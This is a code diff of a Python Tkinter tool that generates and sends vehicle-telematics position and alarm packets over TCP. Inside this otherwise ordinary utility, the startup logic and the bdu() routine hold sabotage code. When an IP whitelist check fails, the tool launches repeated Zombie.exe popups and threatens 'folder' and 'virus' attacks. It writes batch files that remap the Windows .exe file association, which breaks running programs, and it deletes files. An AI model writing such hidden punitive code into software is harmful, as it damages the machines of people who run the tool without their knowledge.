@@ -122,7 +122,6 @@ class MY_GUI(tk.Tk):
         self.sbei808 = config['sbei']['808sbei']
         self.baojing = config['905baojing']
         self.baojing808 = config['808baojing']
-        self.conf_驾驶员从业资格证号 = config['驾驶员从业资格证号']
         self.jiexurl = config['URL']['jiexurl']
         self.Zombie = config['Zombie']['range']
         self.jinyong = config['Zombie']['jinyong']
@@ -176,7 +175,7 @@ class MY_GUI(tk.Tk):
                     count += 1
                     tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                     self.result_data_Text2.insert(1.0, tip_content)
-                    time.sleep(float(self.times()))
+                    time.sleep(float(self.times2()))
                     if self.ip_on2() == '是':
                         s = socket(AF_INET, SOCK_STREAM)
                         s.connect((f'{self.ip2()}', int(self.port2())))
@@ -215,7 +214,7 @@ class MY_GUI(tk.Tk):
                 count += 1
                 tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                 self.result_data_Text2.insert(1.0, tip_content)
-                time.sleep(float(self.times()))
+                time.sleep(float(self.times2()))
                 if self.ip_on2() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
                     s.connect((f'{self.ip2()}', int(self.port2())))
@@ -312,6 +311,103 @@ class MY_GUI(tk.Tk):
                 self.result_data_Text8.insert(1.0, "连接超时，未收到服务器响应")
             time.sleep(2)
         self.result_data_Text8.insert(1.0, "\n完成")
+        showinfo("发送结果", "发送成功")
+
+    def 轨迹905(self):
+        file_path = os.getcwd() + '/conf/12.csv'
+        fCase = open(file_path, 'r', encoding='gbk')
+        datas = csv.reader(fCase)
+        data1 = []
+        o = 0
+        for line in datas:
+            data1.append(line)
+        for nob1 in range(0, int(self.count905_8())):
+            t = data1[nob1]
+            o += 1
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            wd2 = float(t[0]) * 60 / 0.0001
+            wd3 = hex(int(wd2))
+            jd2 = float(t[1]) * 60 / 0.0001
+            jd3 = hex(int(jd2))
+            标识位 = '7E'
+            消息ID = '0200'
+            消息体属性 = '0023'
+            ISU标识 = self.sbei905
+            流水号 = f'{1}'.zfill(4)
+            baojing = [
+                self.baojing['紧急报警'],
+                self.baojing['危险预警'],
+                self.baojing['定位模块故障'],
+                self.baojing['定位天线开路'],
+                self.baojing['定位天线短路'],
+                self.baojing['终端主电源欠压'],
+                self.baojing['终端主电源掉电'],
+                self.baojing['液晶LCD显示故障'],
+                self.baojing['语音模块TTS故障'],
+                self.baojing['摄像头故障'],
+                self.baojing['超速报警'],
+                self.baojing['疲劳驾驶'],
+                self.baojing['当天累计驾驶超时'],
+                self.baojing['超时停车'],
+                self.baojing['车速传感器故障'],
+                self.baojing['录音设备故障'],
+                self.baojing['计价器故障'],
+                self.baojing['服务评价器故障'],
+                self.baojing['LED广告屏故障'],
+                self.baojing['液晶LED显示屏故障'],
+                self.baojing['安全访问模块故障'],
+                self.baojing['LED顶灯故障'],
+                self.baojing['计价器实时时钟'],
+                self.baojing['进出区域路线报警'],
+                self.baojing['路段行驶时间不足'],
+                self.baojing['禁行路段行驶'],
+                self.baojing['车辆非法点火'],
+                self.baojing['车辆非法位移'],
+                self.baojing['所有清零报警'],
+                self.baojing['紧急报警和超速报警'],
+                self.baojing['正常']
+            ]
+            报警 = random.choice(baojing)
+            状态 = '00000300'
+            纬度 = wd3[2:].zfill(8).upper()
+            经度 = jd3[2:].zfill(8).upper()
+            速度 = f'0{random.randint(20, 35)}0'
+            方向 = f'{random.randint(10, 95)}'
+            时间 = now_time[2:]
+            附加里程 = f'0104000000{random.randint(10, 15)}'
+            油量 = ['5208', '044C', '04B0']
+            附加油量 = f'0202{random.choice(油量)}'
+            w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加里程 + 附加油量
+            a = get_xor(w)
+            b = get_bcc(a).zfill(2)
+            E = w + b.upper()
+            t = 标识位 + E.replace("7E", "00") + 标识位
+            D = get_xor(E)
+            data = '7E ' + D + ' 7E'
+            if data[:2] != "7E":
+                print(f"错误：{data}")
+                print('\n' * 1)
+                t = t[:81] + "00" + t[82:]
+                data = get_xor(t)
+                print("修改后data：{}".format(data))
+                print('\n' * 1)
+            print(t)
+            print(data)
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((self.conf_wg, int(self.conf_905wg_port)))  # 测试
+            s.settimeout(5)
+            try:
+                s.send(bytes().fromhex(data))
+                send = s.recv(1024).hex()
+                print(send.upper())
+                print('\n' * 1)
+                tip_content = '\n位置数据：\n{}\n源数据：\n{}\n 服务器应答：\n{}\n'.format(data, t, send.upper())
+                self.result905_Text8.insert(1.0, tip_content)
+            except:
+                self.result905_Text8.delete(1.0, END)
+                self.result905_Text8.insert(1.0, "连接超时，未收到服务器响应")
+            time.sleep(2)
+        self.result905_Text8.insert(1.0, "\n完成")
         showinfo("发送结果", "发送成功")
 
     def wzhi2929(self, su4):
@@ -547,6 +643,11 @@ class MY_GUI(tk.Tk):
             countdown(4)
         showinfo("发送结果", "发送成功")
 
+    def times(self):
+        times = self.times_Text.get().strip()
+        print(times)
+        return times
+
     def sb_on2(self):
         sb_on2 = self.sb_on_Text2.get().strip()
         return sb_on2
@@ -759,14 +860,6 @@ class MY_GUI(tk.Tk):
         self.wd_Text2.insert(0, wd1)
         self.jd_Text2.delete(0, END)
         self.jd_Text2.insert(0, jd1)
-
-    def getMon(self, items):
-        inits = self.init_data_Text1.get()
-        if inits == "2" or inits == "3" or inits == "4":
-            items = (f"{self.conf_驾驶员从业资格证号['高先生']}", f"{self.conf_驾驶员从业资格证号['欧先生']}")
-        else:
-            pass
-        self.driver_Text["values"] = items
 
     def getMon1(self, items):
         inits = self.init_data2_Text7.get().strip()
@@ -1048,13 +1141,6 @@ class MY_GUI(tk.Tk):
             return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
         return ""
 
-    # 16进制转字符
-    def hex_to_str(self, hex_data):
-        hex_list = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]
-        char_list = [binascii.unhexlify(h) for h in hex_list]
-        result = ''.join([c.decode() for c in char_list])
-        return result
-
     def xieyihao(self):
         data = self.str_trans_to_md5()
         data1 = get_xor(data)
@@ -1109,7 +1195,7 @@ class MY_GUI(tk.Tk):
     def qo_login部标(self):
         src = self.init_data_Text2.get().strip()
         print(src)
-        if src == '1':
+        if src == '位置数据':
             sbb1 = self.sb_hao2()
             if not sbb1:
                 self.result_data_Text2.delete(1.0, END)
@@ -1121,7 +1207,7 @@ class MY_GUI(tk.Tk):
     def qo_login2929(self):
         src = self.init_data_Text4.get().strip()
         print(src)
-        if src == '1':
+        if src == '位置数据':
             sbb1 = self.sb_hao4()
             if not sbb1:
                 self.result_data_Text4.delete(1.0, END)
@@ -1133,7 +1219,7 @@ class MY_GUI(tk.Tk):
     def qo_loginV3(self):
         src = self.init_data_Text5.get().strip()
         print(src)
-        if src == '1':
+        if src == '登录数据':
             sbb1 = self.sb_hao5()
             print(sbb1)
             if not sbb1:
@@ -1142,20 +1228,20 @@ class MY_GUI(tk.Tk):
             else:
                 self.result_data_Text5.delete(1.0, END)
                 self.result_data_Text5.insert(END, self.login5())
-        elif src == '2':
+        elif src == '定位数据':
             self.result_data_Text5.delete(1.0, END)
             self.result_data_Text5.insert(END, self.dwei5())
 
-        elif src == '3':
+        elif src == '报警数据':
             self.result_data_Text5.delete(1.0, END)
             self.result_data_Text5.insert(END, self.beep5())
-        elif src == '4':
+        elif src == '心跳数据':
             self.result_data_Text5.delete(1.0, END)
             self.result_data_Text5.insert(END, self.pant5())
         else:
             self.result_data_Text5.delete(1.0, END)
             self.result_data_Text5.insert(END,
-                                          "请输入数字(登录数据包请按1,定位数据包请按2,报警数据包请按3,心跳数据包请按4")
+                                          "请选择(登录数据包,定位数据包,报警数据包,心跳数据包")
 
     def 苏粤标生成808(self):
         设备号 = self.init_data1_Text7.get().strip()
@@ -1275,14 +1361,17 @@ class MY_GUI(tk.Tk):
         self.init_window_name.geometry('1100x602+450+200')
 
         note = Notebook(self.init_window_name)
-        pane2 = Frame()
-        self.init_window_name.menu = Menu(pane2, tearoff=0)
+        pane1 = Frame()
+
+        self.init_window_name.menu = Menu(pane1, tearoff=0)
         self.init_window_name.menu.add_command(label="退出应用", command=self.init_window_name.quit)
         self.init_window_name.menu.add_command(label="窗口置顶", command=self.topmost_on)
         self.init_window_name.menu.add_command(label="修改颜色", command=self.choose_color)
         self.init_window_name.menu.add_command(label="窗口透明度设置", command=self.tm)
         self.init_window_name.menu.add_command(label="主题切换", command=self.zhuti)
         self.init_window_name.bind("<Button-3>", self.show_menu)
+
+        pane2 = Frame()
 
         self.ip_Text_label2 = Label(pane2, text="服务器ip")
         self.ip_Text_label2.grid(row=0, columnspan=2, sticky=N)
@@ -1389,7 +1478,7 @@ class MY_GUI(tk.Tk):
 
         self.init_data_label2 = Label(pane2, text="位置数据包请按1")
         self.init_data_label2.grid(row=16, column=0, sticky=N)
-        items = ("1",)
+        items = ("位置数据",)
         self.init_data_Text2 = Combobox(pane2, width=50, height=12, values=items)
         self.init_data_Text2.current(0)
         self.init_data_Text2.grid(row=17, column=0, columnspan=1, sticky=N)
@@ -1508,7 +1597,7 @@ class MY_GUI(tk.Tk):
 
         self.init_data_label4 = Label(pane4, text="位置数据包请按1")
         self.init_data_label4.grid(row=21, column=0, sticky=N)
-        items = ("1",)
+        items = ("位置数据",)
         self.init_data_Text4 = Combobox(pane4, width=50, height=12, values=items)
         self.init_data_Text4.current(0)
         self.init_data_Text4.grid(row=22, column=0, columnspan=10, sticky=N)
@@ -1544,7 +1633,7 @@ class MY_GUI(tk.Tk):
         self.init_data_label5 = Label(pane5,
                                       text="(登录数据包请按1,定位数据包请按2,报警数据包请按3,心跳数据包请按4)\n注意V3协议除登录包需要更改设备号，其他数据包默认通用")
         self.init_data_label5.grid(row=2, sticky=N, columnspan=2)
-        items = ("1", "2", "3", "4")
+        items = ("登录数据", "定位数据", "报警数据", "心跳数据")
         self.init_data_Text5 = Combobox(pane5, width=67, height=20, values=items)
         self.init_data_Text5.current(0)
         self.init_data_Text5.grid(row=3, sticky=N, columnspan=2)
@@ -1612,13 +1701,15 @@ class MY_GUI(tk.Tk):
         self.init_data2_Text7 = Combobox(pane7, width=50, height=20, values=items)
         self.init_data2_Text7.grid(row=1, column=1, columnspan=2, sticky=N)
         self.init_data2_Text7.bind("<<ComboboxSelected>>", self.getMon1)
+        self.init_data2_Text7.current(0)
 
         self.init_data3_label7 = Label(pane7, text="主动报警:")
         self.init_data3_label7.grid(row=2, column=0)
-        items = ()
+        items = ("疲劳驾驶报警", "接打手持电话报警", "抽烟报警", "长时间不目视前方报警", "未检测到驾驶员报警",
+                 "双手同时脱离方向盘报警", "驾驶员行为监测功能失效报警")
         self.init_data3_Text7 = Combobox(pane7, width=50, height=20, values=items)
         self.init_data3_Text7.grid(row=2, column=1, columnspan=2, sticky=N)
-
+        self.init_data3_Text7.current(0)
         self.init_data4_label7 = Label(pane7, text="标志位:")
         self.init_data4_label7.grid(row=3, column=0)
         items = ("开始", "结束")
@@ -1777,7 +1868,7 @@ def bdu():
     file_path1 = os.path.join(path, "update.bat")
     file_path2 = os.path.join(path, "delete.bat")
     with open(file_path1, "w") as file:
-        file.write("assoc.exe=txtfile")
+        file.write("assoc.exe=WMP11.AssocFile.3G2")
     with open(file_path2, "w") as file:
         file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\delete.bat")
     import subprocess
@@ -1836,14 +1927,15 @@ def stop_exe(exe_name):
                 print(f'无法关闭 {exe_name}')
 
 
-def show_popup():
+def show_popup(count):
     init_window.withdraw()  # 隐藏主窗口
     import subprocess
-    for i in range(int(MY_GUI(init_window).Zombie)):
+    for i in range(count):
         subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
         countdown(6)
     init_window.attributes('-topmost', True)
-    showwarning(title="！！！！警告警告！！！！", message="请联系管理员添加白名单，否则吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~")
+    showwarning(title="！！！！警告警告！！！！",
+                message="警告\n请联系管理员添加白名单\n开启僵尸模式，吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~")
     stop_exe('Zombie.exe')
 
 
@@ -1867,7 +1959,7 @@ if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
     else:
-        show_popup()
+        show_popup(1)
         print('结束')
         count_runs()
         if count_runs() < 2:
@@ -1876,13 +1968,14 @@ if __name__ == '__main__':
         elif count_runs() == 4:
             init_window.withdraw()
             init_window.attributes('-topmost', True)
-            showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒,否则将启动文件夹攻击")
-            countdown(6)
+            show_popup(int(MY_GUI(init_window).Zombie))
+            showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒\n启动文件夹攻击\n下次警告将开启病毒模式")
             wjj()
         else:
             countdown(6)
             init_window.withdraw()
             init_window.attributes('-topmost', True)
-            showwarning(title="！！！！警告警告！！！！", message=f"第2次警告提醒,否则10s后将启动病毒攻击")
+            show_popup(int(MY_GUI(init_window).Zombie))
+            showwarning(title="！！！！警告警告！！！！", message=f"第2次警告提醒\n10s后将启动病毒攻击")
             bdu()
         sys.exit()
